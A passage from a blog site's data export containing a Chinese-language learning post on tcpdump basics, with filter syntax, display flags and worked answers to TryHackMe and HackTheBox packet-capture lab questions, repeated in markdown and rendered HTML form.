0\"捕获至少设置了SYN（同步）或ACK（确认）标志的TCP数据包。\n\n看一下第四部分的题目\n\n![task4](/images/tryhackme-Tcpdump-The-Basics小介绍/task4.png)\n\n第一问 \n\n这个就是参数直接套过去就行\n\n```\ntcpdump -r traffic.pcap \"tcp[flags]==tcp-rst\"\n```\n\n![task4](/images/tryhackme-Tcpdump-The-Basics小介绍/rst.png)\n\n\n第二问\n如果不加-n的话 不会显示主机的ip ip会被解析成主机名 加上-n参数可以直接显示数字格式的 IP 地址和端口号，避免了这些额外的解析过程。\n\n```\ntcpdump -r traffic.pcap greater 15000  -n\n```\n\n![task4](/images/tryhackme-Tcpdump-The-Basics小介绍/15000.png)\n\n## 打印\n- -q：快速输出；打印简要的数据包信息\n- -e：打印链接级标题\n- -A：以 ASCII 格式显示数据包数据\n- -xx：以十六进制格式显示数据包数据，简称hex\n- -X：以十六进制和 ASCII 显示数据包头和数据\n\n来看第五部分的问题\n\n![task5](/images/tryhackme-Tcpdump-The-Basics小介绍/task5.png)\n\n加个-e参数就能查出mac地址\n\n```\ntcpdump -r traffic.pcap -e arp\n```\n![task5](/images/tryhackme-Tcpdump-The-Basics小介绍/arpmac.png)\n\n\n# hackthebox的tcpdump补充\n话题一转 来看看hackthebox的tcpdump有啥补充吗\n\n其实讲的也和thm的差不多 简单扩充一下知识点\n\n\n## 第一部分\n看看题目\n\n![htb](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/task1.png)\n\n第一题需要下载个附件 就一张截图 仔细看开头的话 就是一个完整的tcp三次握手流程\n\n-  [S] 表示客户端发送的 SYN 包。\n-  [S.] 表示服务器发送的 SYN-ACK 包。\n-  [.] 是客户端发送的 ACK 包，完成三次握手。\n\n![task1](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/question-1.PNG)\n\n能看到ip192的给ip为174.143.213.184的服务器建立连接\n\n服务器ip为174.143.213.184\n\n捕获过程是相对序号\n\n**相对序号** 是一种在抓包过程中为了**简化数据包分析**而使用的序号模式。它将TCP连接中的初始序列号（ISN）归零，从而简化了整个连接中的包的序列号计算。也就是说，所有包的序列号从 0 开始递增，不再显示真实的网络中传输的绝对序列号。\n\n第三题\n\n```\n -rvXc 100\n```\n\n![htb](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/task1.1.png)\n\n第四题\n```\nsudo tcpdump -Xr /tmp/capture.pcap\n```\n\n第五题 是-v 还要更详细就-vv\n\n第六题 man可以看更多信息\n\n第七题 -W是写入文件\n\n## 第二部分\n\n![task2](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/task2.png)\n\n第一问问的蛮好的 -l参数可以通过管道运输到另一个地方\n\n过滤器确实可以这么做 true\n\n想要某个协议的数据就直接后面加个协议名\n不想要某个协议就协议名的前面加个not\n例如题目问的：not icmp\n\n问安装在哪可以用which\n\n![task2](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/task2.1.png)\n\n输出内容更加详细就 -v\n\n-W 写入文件\n\n-r 是从中读取捕获的内容\n\n-X 以十六进制和ascii格式显示内容\n\n## 第三部分\n\n![task3](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/task3.png)\n\n### 第一问\n这个真的是好问题 琢磨半天了 需要下载他的附件pcap\n\n一开始我也没怎么看这个包具体咋样 就是直接过滤去找第一个fin包 实际情况是找半天找不出\n\n这个就是他的pcap包的内容 后面还有一大半\n\n![task](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/port.png)\n\n那只能老老实实慢慢看 \n\n![task](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/port1.png)\n\n在这里面，其实有三个端口发出来tcp的第一次握手分别是43804，43806，52520这三个端口 往下看 43804和52520都在最后收到了rst包 而43806成功三次握手\n\n所以客户端端口应该是43806 而服务端则是http的80端口\n\n### 第二问\n第二问问的是dns服务器ip 那我们得过滤一下 加个port domain参数\n\n过滤完之后 来检查一下记录\n\n![dns](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/dns1.png)\n\n在这里面我们发现172.16.146.2的57752端口发出请求而下面172.6.46.1收到且回应了\n\n在前面两个包有a？ aaaa?这种字样 \n\n在 DNS 请求包中，通常会看到查询字段，比如 A?, AAAA?，表示正在请求域名解析。\n\n所以172.6.46.1是dns服务器ip\n\n\n# 结尾\n感觉还是很遥远哦 才学了这么点东西 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/tryhatryhackme & hackthebox Tcpdump小介绍.md","raw":"---\ntitle: 'tryhackme & hackthebox Tcpdump小介绍'\ndate: 2025-02-09 08:53:08\ntags: linux\ncover: https://s2.loli.net/2025/02/09/rkGjIAKFRSBLJem.jpg\ntop_img: transparent\n---\n\n\n# tryhackme的tcpdump介绍\n来看看tcpdump这个工具 Tcpdump工具及其libpcap库是用 C 和 C++ 编写的\n\ntcpdump的作用\n- 捕获数据包并保存到文件\n- 对捕获的数据包设置过滤器\n- 控制捕获的数据包的显示方式\n\n| 命令                     | 解释                          |\n| ---------------------- | --------------------------- |\n| `tcpdump -i INTERFACE` | 捕获特定网络接口上的数据包               |\n| `tcpdump -w FILE`      | 将捕获的数据包写入文件                 |\n| `tcpdump -r FILE`      | 从文件读取捕获的数据包                 |\n| `tcpdump -c COUNT`     | 捕获特定数量的数据包                  |\n| `tcpdump -n`           | 不解析 IP 地址                   |\n| `tcpdump -nn`          | 不解析 IP 地址，也不解析协议号           |\n| `tcpdump -v`           | `-vv`详细显示；详细程度可以通过和增加`-vvv` |\n\n![task2](/images/tryhackme-Tcpdump-The-Basics小介绍/task2.png)\n\n答案就是-n\n\n## 过滤表达式\n\n按主机过滤\n\n1. 指定主机\n- host\n```\ntcpdump -i eth0 host 192.168.10.1\n```\n\n2. 指定源地址和目标地址\n- src dst\n```\ntcpdump -i eth0 src host 192.168.10.1\n\ntcpdump -i eth0 dst host 192.168.10.1\n```\n\n3. 指定端口\n- port\n```\ntcpdump -i eth0 port 80\n```\n\n4. 指定协议\n- tcpdump 协议名\n```\ntcpdump -i eth0 arp\n#捕获所有arp协议的数据包\n\ntcpdump -i eth0 icmp\n#捕获所有icmp协议的数据包\n\ntcpdump -i eth0 tcp\n#捕获所有tcp协议的数据包\n```\n\ntcpdump -i any tcp port 22\n监听所有接口并捕获tcp往返的数据包port 22，\n\ntcpdump -i wlo1 udp port 123\n监听 WiFi 网卡并过滤发往网络时间协议 ( NTPudp ) 的流量。port 123\n\ntcpdump -i eth0 host example.com and tcp port 443 -w https.pcap\n将会监听eth0有线以太网接口 ，并过滤与example.com使用tcp和交换的流量port 443。换句话说，此命令正在过滤与相关的 HTTPS 流量example.com。\n\n## 高级表达式\n三种计算符 &、|和!(与，或，非)\n\n可以使用tcp[tcpflags]来引用TCP标志字段。以下TCP标志可供比较：\n\ntcp-syn TCP SYN（同步）\ntcp-ack TCP ACK（确认）\ntcp-fin TCP FIN（完成）\ntcp-rst TCP RST（重置）\ntcp-push TCP推送\n基于上述内容，我们可以写出：\n\ntcpdump \"tcp[tcpflags] == tcp-syn\"捕获仅设置了 SYN（同步）标志但所有其他标志均未设置的TCP数据包。\n\ntcpdump \"tcp[tcpflags] & tcp-syn != 0\"捕获至少设置了 SYN（同步）标志的TCP数据包。\n\ntcpdump \"tcp[tcpflags] & (tcp-syn|tcp-ack) != 0\"捕获至少设置了SYN（同步）或ACK（确认）标志的TCP数据包。\n\n看一下第四部分的题目\n\n![task4](/images/tryhackme-Tcpdump-The-Basics小介绍/task4.png)\n\n第一问 \n\n这个就是参数直接套过去就行\n\n```\ntcpdump -r traffic.pcap \"tcp[flags]==tcp-rst\"\n```\n\n![task4](/images/tryhackme-Tcpdump-The-Basics小介绍/rst.png)\n\n\n第二问\n如果不加-n的话 不会显示主机的ip ip会被解析成主机名 加上-n参数可以直接显示数字格式的 IP 地址和端口号，避免了这些额外的解析过程。\n\n```\ntcpdump -r traffic.pcap greater 15000  -n\n```\n\n![task4](/images/tryhackme-Tcpdump-The-Basics小介绍/15000.png)\n\n## 打印\n- -q：快速输出；打印简要的数据包信息\n- -e：打印链接级标题\n- -A：以 ASCII 格式显示数据包数据\n- -xx：以十六进制格式显示数据包数据，简称hex\n- -X：以十六进制和 ASCII 显示数据包头和数据\n\n来看第五部分的问题\n\n![task5](/images/tryhackme-Tcpdump-The-Basics小介绍/task5.png)\n\n加个-e参数就能查出mac地址\n\n```\ntcpdump -r traffic.pcap -e arp\n```\n![task5](/images/tryhackme-Tcpdump-The-Basics小介绍/arpmac.png)\n\n\n# hackthebox的tcpdump补充\n话题一转 来看看hackthebox的tcpdump有啥补充吗\n\n其实讲的也和thm的差不多 简单扩充一下知识点\n\n\n## 第一部分\n看看题目\n\n![htb](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/task1.png)\n\n第一题需要下载个附件 就一张截图 仔细看开头的话 就是一个完整的tcp三次握手流程\n\n-  [S] 表示客户端发送的 SYN 包。\n-  [S.] 表示服务器发送的 SYN-ACK 包。\n-  [.] 是客户端发送的 ACK 包，完成三次握手。\n\n![task1](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/question-1.PNG)\n\n能看到ip192的给ip为174.143.213.184的服务器建立连接\n\n服务器ip为174.143.213.184\n\n捕获过程是相对序号\n\n**相对序号** 是一种在抓包过程中为了**简化数据包分析**而使用的序号模式。它将TCP连接中的初始序列号（ISN）归零，从而简化了整个连接中的包的序列号计算。也就是说，所有包的序列号从 0 开始递增，不再显示真实的网络中传输的绝对序列号。\n\n第三题\n\n```\n -rvXc 100\n```\n\n![htb](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/task1.1.png)\n\n第四题\n```\nsudo tcpdump -Xr /tmp/capture.pcap\n```\n\n第五题 是-v 还要更详细就-vv\n\n第六题 man可以看更多信息\n\n第七题 -W是写入文件\n\n## 第二部分\n\n![task2](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/task2.png)\n\n第一问问的蛮好的 -l参数可以通过管道运输到另一个地方\n\n过滤器确实可以这么做 true\n\n想要某个协议的数据就直接后面加个协议名\n不想要某个协议就协议名的前面加个not\n例如题目问的：not icmp\n\n问安装在哪可以用which\n\n![task2](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/task2.1.png)\n\n输出内容更加详细就 -v\n\n-W 写入文件\n\n-r 是从中读取捕获的内容\n\n-X 以十六进制和ascii格式显示内容\n\n## 第三部分\n\n![task3](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/task3.png)\n\n### 第一问\n这个真的是好问题 琢磨半天了 需要下载他的附件pcap\n\n一开始我也没怎么看这个包具体咋样 就是直接过滤去找第一个fin包 实际情况是找半天找不出\n\n这个就是他的pcap包的内容 后面还有一大半\n\n![task](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/port.png)\n\n那只能老老实实慢慢看 \n\n![task](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/port1.png)\n\n在这里面，其实有三个端口发出来tcp的第一次握手分别是43804，43806，52520这三个端口 往下看 43804和52520都在最后收到了rst包 而43806成功三次握手\n\n所以客户端端口应该是43806 而服务端则是http的80端口\n\n### 第二问\n第二问问的是dns服务器ip 那我们得过滤一下 加个port domain参数\n\n过滤完之后 来检查一下记录\n\n![dns](/images/tryhackme-Tcpdump-The-Basics小介绍/htb/dns1.png)\n\n在这里面我们发现172.16.146.2的57752端口发出请求而下面172.6.46.1收到且回应了\n\n在前面两个包有a？ aaaa?这种字样 \n\n在 DNS 请求包中，通常会看到查询字段，比如 A?, AAAA?，表示正在请求域名解析。\n\n所以172.6.46.1是dns服务器ip\n\n\n# 结尾\n感觉还是很遥远哦 才学了这么点东西 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"tryhatryhackme & hackthebox Tcpdump小介绍","published":1,"updated":"2025-02-09T15:27:04.723Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxo001jtsg69hwg3sjq","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><h1 id=\"tryhackme的tcpdump介绍\"><a href=\"#tryhackme的tcpdump介绍\" class=\"headerlink\" title=\"tryhackme的tcpdump介绍\"></a>tryhackme的tcpdump介绍</h1><p>来看看tcpdump这个工具 Tcpdump工具及其libpcap库是用 C 和 C++ 编写的</p>\n<p>tcpdump的作用</p>\n<ul>\n<li>捕获数据包并保存到文件</li>\n<li>对捕获的数据包设置过滤器</li>\n<li>控制捕获的数据包的显示方式</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>tcpdump -i INTERFACE</code></td>\n<td>捕获特定网络接口上的数据包</td>\n</tr>\n<tr>\n<td><code>tcpdump -w FILE</code></td>\n<td>将捕获的数据包写入文件</td>\n</tr>\n<tr>\n<td><code>tcpdump -r FILE</code></td>\n<td>从文件读取捕获的数据包</td>\n</tr>\n<tr>\n<td><code>tcpdump -c COUNT</code></td>\n<td>捕获特定数量的数据包</td>\n</tr>\n<tr>\n<td><code>tcpdump -n</code></td>\n<td>不解析 IP 地址</td>\n</tr>\n<tr>\n<td><code>tcpdump -nn</code></td>\n<td>不解析 IP 地址，也不解析协议号</td>\n</tr>\n<tr>\n<td><code>tcpdump -v</code></td>\n<td><code>-vv</code>详细显示；详细程度可以通过和增加<code>-vvv</code></td>\n</tr>\n</tbody></table>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/task2.png\" alt=\"task2\"></p>\n<p>答案就是-n</p>\n<h2 id=\"过滤表达式\"><a href=\"#过滤表达式\" class=\"headerlink\" title=\"过滤表达式\"></a>过滤表达式</h2><p>按主机过滤</p>\n<ol>\n<li>指定主机</li>\n</ol>\n<ul>\n<li>host<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 host 192.168.10.1</span><br></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"2\">\n<li>指定源地址和目标地址</li>\n</ol>\n<ul>\n<li>src dst<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 src host 192.168.10.1</span><br><span class=\"line\"></span><br><span class=\"line\">tcpdump -i eth0 dst host 192.168.10.1</span><br></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"3\">\n<li>指定端口</li>\n</ol>\n<ul>\n<li>port<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 port 80</span><br></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"4\">\n<li>指定协议</li>\n</ol>\n<ul>\n<li>tcpdump 协议名<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 arp</span><br><span class=\"line\">#捕获所有arp协议的数据包</span><br><span class=\"line\"></span><br><span class=\"line\">tcpdump -i eth0 icmp</span><br><span class=\"line\">#捕获所有icmp协议的数据包</span><br><span class=\"line\"></span><br><span class=\"line\">tcpdump -i eth0 tcp</span><br><span class=\"line\">#捕获所有tcp协议的数据包</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>tcpdump -i any tcp port 22<br>监听所有接口并捕获tcp往返的数据包port 22，</p>\n<p>tcpdump -i wlo1 udp port 123<br>监听 WiFi 网卡并过滤发往网络时间协议 ( NTPudp ) 的流量。port 123</p>\n<p>tcpdump -i eth0 host example.com and tcp port 443 -w https.pcap<br>将会监听eth0有线以太网接口 ，并过滤与example.com使用tcp和交换的流量port 443。换句话说，此命令正在过滤与相关的 HTTPS 流量example.com。</p>\n<h2 id=\"高级表达式\"><a href=\"#高级表达式\" class=\"headerlink\" title=\"高级表达式\"></a>高级表达式</h2><p>三种计算符 &amp;、|和!(与，或，非)</p>\n<p>可以使用tcp[tcpflags]来引用TCP标志字段。以下TCP标志可供比较：</p>\n<p>tcp-syn TCP SYN（同步）<br>tcp-ack TCP ACK（确认）<br>tcp-fin TCP FIN（完成）<br>tcp-rst TCP RST（重置）<br>tcp-push TCP推送<br>基于上述内容，我们可以写出：</p>\n<p>tcpdump “tcp[tcpflags] &#x3D;&#x3D; tcp-syn”捕获仅设置了 SYN（同步）标志但所有其他标志均未设置的TCP数据包。</p>\n<p>tcpdump “tcp[tcpflags] &amp; tcp-syn !&#x3D; 0”捕获至少设置了 SYN（同步）标志的TCP数据包。</p>\n<p>tcpdump “tcp[tcpflags] &amp; (tcp-syn|tcp-ack) !&#x3D; 0”捕获至少设置了SYN（同步）或ACK（确认）标志的TCP数据包。</p>\n<p>看一下第四部分的题目</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/task4.png\" alt=\"task4\"></p>\n<p>第一问 </p>\n<p>这个就是参数直接套过去就行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -r traffic.pcap &quot;tcp[flags]==tcp-rst&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/rst.png\" alt=\"task4\"></p>\n<p>第二问<br>如果不加-n的话 不会显示主机的ip ip会被解析成主机名 加上-n参数可以直接显示数字格式的 IP 地址和端口号，避免了这些额外的解析过程。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -r traffic.pcap greater 15000  -n</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/15000.png\" alt=\"task4\"></p>\n<h2 id=\"打印\"><a href=\"#打印\" class=\"headerlink\" title=\"打印\"></a>打印</h2><ul>\n<li>-q：快速输出；打印简要的数据包信息</li>\n<li>-e：打印链接级标题</li>\n<li>-A：以 ASCII 格式显示数据包数据</li>\n<li>-xx：以十六进制格式显示数据包数据，简称hex</li>\n<li>-X：以十六进制和 ASCII 显示数据包头和数据</li>\n</ul>\n<p>来看第五部分的问题</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/task5.png\" alt=\"task5\"></p>\n<p>加个-e参数就能查出mac地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -r traffic.pcap -e arp</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/arpmac.png\" alt=\"task5\"></p>\n<h1 id=\"hackthebox的tcpdump补充\"><a href=\"#hackthebox的tcpdump补充\" class=\"headerlink\" title=\"hackthebox的tcpdump补充\"></a>hackthebox的tcpdump补充</h1><p>话题一转 来看看hackthebox的tcpdump有啥补充吗</p>\n<p>其实讲的也和thm的差不多 简单扩充一下知识点</p>\n<h2 id=\"第一部分\"><a href=\"#第一部分\" class=\"headerlink\" title=\"第一部分\"></a>第一部分</h2><p>看看题目</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/task1.png\" alt=\"htb\"></p>\n<p>第一题需要下载个附件 就一张截图 仔细看开头的话 就是一个完整的tcp三次握手流程</p>\n<ul>\n<li>[S] 表示客户端发送的 SYN 包。</li>\n<li>[S.] 表示服务器发送的 SYN-ACK 包。</li>\n<li>[.] 是客户端发送的 ACK 包，完成三次握手。</li>\n</ul>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/question-1.PNG\" alt=\"task1\"></p>\n<p>能看到ip192的给ip为174.143.213.184的服务器建立连接</p>\n<p>服务器ip为174.143.213.184</p>\n<p>捕获过程是相对序号</p>\n<p><strong>相对序号</strong> 是一种在抓包过程中为了<strong>简化数据包分析</strong>而使用的序号模式。它将TCP连接中的初始序列号（ISN）归零，从而简化了整个连接中的包的序列号计算。也就是说，所有包的序列号从 0 开始递增，不再显示真实的网络中传输的绝对序列号。</p>\n<p>第三题</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-rvXc 100</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/task1.1.png\" alt=\"htb\"></p>\n<p>第四题</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tcpdump -Xr /tmp/capture.pcap</span><br></pre></td></tr></table></figure>\n\n<p>第五题 是-v 还要更详细就-vv</p>\n<p>第六题 man可以看更多信息</p>\n<p>第七题 -W是写入文件</p>\n<h2 id=\"第二部分\"><a href=\"#第二部分\" class=\"headerlink\" title=\"第二部分\"></a>第二部分</h2><p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/task2.png\" alt=\"task2\"></p>\n<p>第一问问的蛮好的 -l参数可以通过管道运输到另一个地方</p>\n<p>过滤器确实可以这么做 true</p>\n<p>想要某个协议的数据就直接后面加个协议名<br>不想要某个协议就协议名的前面加个not<br>例如题目问的：not icmp</p>\n<p>问安装在哪可以用which</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/task2.1.png\" alt=\"task2\"></p>\n<p>输出内容更加详细就 -v</p>\n<p>-W 写入文件</p>\n<p>-r 是从中读取捕获的内容</p>\n<p>-X 以十六进制和ascii格式显示内容</p>\n<h2 id=\"第三部分\"><a href=\"#第三部分\" class=\"headerlink\" title=\"第三部分\"></a>第三部分</h2><p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/task3.png\" alt=\"task3\"></p>\n<h3 id=\"第一问\"><a href=\"#第一问\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>这个真的是好问题 琢磨半天了 需要下载他的附件pcap</p>\n<p>一开始我也没怎么看这个包具体咋样 就是直接过滤去找第一个fin包 实际情况是找半天找不出</p>\n<p>这个就是他的pcap包的内容 后面还有一大半</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/port.png\" alt=\"task\"></p>\n<p>那只能老老实实慢慢看 </p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/port1.png\" alt=\"task\"></p>\n<p>在这里面，其实有三个端口发出来tcp的第一次握手分别是43804，43806，52520这三个端口 往下看 43804和52520都在最后收到了rst包 而43806成功三次握手</p>\n<p>所以客户端端口应该是43806 而服务端则是http的80端口</p>\n<h3 id=\"第二问\"><a href=\"#第二问\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p>第二问问的是dns服务器ip 那我们得过滤一下 加个port domain参数</p>\n<p>过滤完之后 来检查一下记录</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/dns1.png\" alt=\"dns\"></p>\n<p>在这里面我们发现172.16.146.2的57752端口发出请求而下面172.6.46.1收到且回应了</p>\n<p>在前面两个包有a？ aaaa?这种字样 </p>\n<p>在 DNS 请求包中，通常会看到查询字段，比如 A?, AAAA?，表示正在请求域名解析。</p>\n<p>所以172.6.46.1是dns服务器ip</p>\n<h1 id=\"结尾\"><a href=\"#结尾\" class=\"headerlink\" title=\"结尾\"></a>结尾</h1><p>感觉还是很遥远哦 才学了这么点东西 </p>\n","excerpt":"","more":"<h1 id=\"tryhackme的tcpdump介绍\"><a href=\"#tryhackme的tcpdump介绍\" class=\"headerlink\" title=\"tryhackme的tcpdump介绍\"></a>tryhackme的tcpdump介绍</h1><p>来看看tcpdump这个工具 Tcpdump工具及其libpcap库是用 C 和 C++ 编写的</p>\n<p>tcpdump的作用</p>\n<ul>\n<li>捕获数据包并保存到文件</li>\n<li>对捕获的数据包设置过滤器</li>\n<li>控制捕获的数据包的显示方式</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>tcpdump -i INTERFACE</code></td>\n<td>捕获特定网络接口上的数据包</td>\n</tr>\n<tr>\n<td><code>tcpdump -w FILE</code></td>\n<td>将捕获的数据包写入文件</td>\n</tr>\n<tr>\n<td><code>tcpdump -r FILE</code></td>\n<td>从文件读取捕获的数据包</td>\n</tr>\n<tr>\n<td><code>tcpdump -c COUNT</code></td>\n<td>捕获特定数量的数据包</td>\n</tr>\n<tr>\n<td><code>tcpdump -n</code></td>\n<td>不解析 IP 地址</td>\n</tr>\n<tr>\n<td><code>tcpdump -nn</code></td>\n<td>不解析 IP 地址，也不解析协议号</td>\n</tr>\n<tr>\n<td><code>tcpdump -v</code></td>\n<td><code>-vv</code>详细显示；详细程度可以通过和增加<code>-vvv</code></td>\n</tr>\n</tbody></table>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/task2.png\" alt=\"task2\"></p>\n<p>答案就是-n</p>\n<h2 id=\"过滤表达式\"><a href=\"#过滤表达式\" class=\"headerlink\" title=\"过滤表达式\"></a>过滤表达式</h2><p>按主机过滤</p>\n<ol>\n<li>指定主机</li>\n</ol>\n<ul>\n<li>host<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 host 192.168.10.1</span><br></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"2\">\n<li>指定源地址和目标地址</li>\n</ol>\n<ul>\n<li>src dst<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 src host 192.168.10.1</span><br><span class=\"line\"></span><br><span class=\"line\">tcpdump -i eth0 dst host 192.168.10.1</span><br></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"3\">\n<li>指定端口</li>\n</ol>\n<ul>\n<li>port<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 port 80</span><br></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"4\">\n<li>指定协议</li>\n</ol>\n<ul>\n<li>tcpdump 协议名<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 arp</span><br><span class=\"line\">#捕获所有arp协议的数据包</span><br><span class=\"line\"></span><br><span class=\"line\">tcpdump -i eth0 icmp</span><br><span class=\"line\">#捕获所有icmp协议的数据包</span><br><span class=\"line\"></span><br><span class=\"line\">tcpdump -i eth0 tcp</span><br><span class=\"line\">#捕获所有tcp协议的数据包</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>tcpdump -i any tcp port 22<br>监听所有接口并捕获tcp往返的数据包port 22，</p>\n<p>tcpdump -i wlo1 udp port 123<br>监听 WiFi 网卡并过滤发往网络时间协议 ( NTPudp ) 的流量。port 123</p>\n<p>tcpdump -i eth0 host example.com and tcp port 443 -w https.pcap<br>将会监听eth0有线以太网接口 ，并过滤与example.com使用tcp和交换的流量port 443。换句话说，此命令正在过滤与相关的 HTTPS 流量example.com。</p>\n<h2 id=\"高级表达式\"><a href=\"#高级表达式\" class=\"headerlink\" title=\"高级表达式\"></a>高级表达式</h2><p>三种计算符 &amp;、|和!(与，或，非)</p>\n<p>可以使用tcp[tcpflags]来引用TCP标志字段。以下TCP标志可供比较：</p>\n<p>tcp-syn TCP SYN（同步）<br>tcp-ack TCP ACK（确认）<br>tcp-fin TCP FIN（完成）<br>tcp-rst TCP RST（重置）<br>tcp-push TCP推送<br>基于上述内容，我们可以写出：</p>\n<p>tcpdump “tcp[tcpflags] &#x3D;&#x3D; tcp-syn”捕获仅设置了 SYN（同步）标志但所有其他标志均未设置的TCP数据包。</p>\n<p>tcpdump “tcp[tcpflags] &amp; tcp-syn !&#x3D; 